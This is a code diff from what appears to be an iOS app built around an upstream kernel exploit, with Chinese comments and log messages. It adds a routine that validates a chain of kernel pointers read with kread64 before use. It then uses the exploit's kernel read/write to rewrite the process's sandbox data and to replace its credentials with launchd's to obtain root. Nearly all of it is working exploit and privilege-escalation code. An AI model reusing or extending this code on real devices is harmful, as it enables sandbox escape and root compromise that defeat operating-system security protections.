@@ -23,7 +23,61 @@
 
 extern uint64_t g_kernel_base;
 
-#pragma mark - 状态
+// 上游 krw/kexploit 里的全局量（没有写进头文件，这里自己声明）
+extern uint64_t rwSocketPcb;
+extern uint64_t controlSocketPcb;
+extern int rwSocket;
+extern int controlSocket;
+extern int highestSuccessIdx;
+extern int successReadCount;
+
+#pragma mark - 内核读写「体检」
+
+/// 漏洞 race 失败时，上游的 early_kread 会走 `*(int *)1 = 0` 主动把进程打崩。
+/// 所以真正使用内核读写之前，必须自己把 proc_self() 要走的每一跳都验一遍：
+/// 任何一跳不是合法内核地址，就干净地失败并给出可读原因，而不是闪退。
+static uint64_t ds_safe_self_proc(DSKernelLogBlock log)
+{
+    if (!is_kaddr_valid(rwSocketPcb)) {
+        if (log) log([NSString stringWithFormat:
+                      @"[DSFile] 漏洞 race 没成功：rwSocketPcb = 0x%llx 不是合法内核地址"
+                       "（highestSuccessIdx=%d, successReadCount=%d, rwSocket=%d, controlSocket=%d）。"
+                       "上游实现遇到这种情况会故意崩掉进程，这里直接停下，App 保持可用。",
+                      rwSocketPcb, highestSuccessIdx, successReadCount, rwSocket, controlSocket]);
+        return 0;
+    }
+
+    uint64_t socketAddr = kread64(rwSocketPcb + off_inpcb_inp_socket);
+    if (!is_kaddr_valid(socketAddr)) {
+        if (log) log([NSString stringWithFormat:@"[DSFile] 内核读写体检失败：socket = 0x%llx", socketAddr]);
+        return 0;
+    }
+
+    uint64_t thread = kread64(socketAddr + off_socket_so_background_thread);
+    if (!is_kaddr_valid(thread)) {
+        if (log) log([NSString stringWithFormat:@"[DSFile] 内核读写体检失败：thread = 0x%llx", thread]);
+        return 0;
+    }
+
+    uint64_t threadRo = kread64(thread + off_thread_t_tro);
+    if (!is_kaddr_valid(threadRo)) {
+        if (log) log([NSString stringWithFormat:@"[DSFile] 内核读写体检失败：thread_ro = 0x%llx", threadRo]);
+        return 0;
+    }
+
+    uint64_t proc = kread64(threadRo + off_thread_ro_tro_proc);
+    if (!is_kaddr_valid(proc)) {
+        if (log) log([NSString stringWithFormat:@"[DSFile] 内核读写体检失败：proc = 0x%llx", proc]);
+        return 0;
+    }
+
+    if (log) log([NSString stringWithFormat:@"[DSFile] 内核读写体检通过：self proc = 0x%llx", proc]);
+    return proc;
+}
+
+@implementation DSKernel
+
+#pragma mark - 设备 / 系统
 
 static BOOL gExploitRunning = NO;
 static BOOL gExploitAttempted = NO;
@@ -328,15 +382,12 @@ static uint32_t ds_cpu_family(void)
 {
     if (log) log(@"[DSFile] 开始改写本进程沙盒数据…");
 
-    uint64_t selfProc = 0;
-    @try {
-        selfProc = proc_self();
-    } @catch (NSException *e) {
-        if (log) log([NSString stringWithFormat:@"[DSFile] proc_self 异常: %@", e.reason]);
-    }
+    uint64_t selfProc = ds_safe_self_proc(log);
     if (!selfProc) {
-        if (log) log(@"[DSFile] 取不到本进程 proc 地址");
-        return DSKernelResultEscapeFailed;
+        if (log) log(@"[DSFile] 内核读写不可用，跳过沙盒改写。请从后台完全退出 App，重新打开后再点一次「激活内核访问」。");
+        gLastError = [NSError errorWithDomain:@"DSFile" code:DSKernelResultExploitFailed
+                                     userInfo:@{ NSLocalizedDescriptionKey: @"内核漏洞这次没成功（race 失败），请退出 App 重开后重试" }];
+        return DSKernelResultExploitFailed;
     }
 
     int sret = -1;
@@ -373,9 +424,18 @@ static uint32_t ds_cpu_family(void)
     }
 
     if (log) log(@"[DSFile] 尝试把本进程 ucred 换成 launchd 的（uid=0）…");
+
+    // sandbox_elevate_to_root 内部会走 proc_find_by_name("launchd") → proc_self()，
+    // 内核读写不健康时那一步会直接崩进程，所以先体检。
+    uint64_t selfProc = ds_safe_self_proc(log);
+    if (!selfProc) {
+        if (log) log(@"[DSFile] 内核读写不可用，提权已放弃（不会崩进程）。");
+        return DSKernelResultExploitFailed;
+    }
+
     int ret = -1;
     @try {
-        ret = sandbox_elevate_to_root(proc_self());
+        ret = sandbox_elevate_to_root(selfProc);
     } @catch (NSException *e) {
         if (log) log([NSString stringWithFormat:@"[DSFile] 提权异常: %@", e.reason]);
         ret = -1;
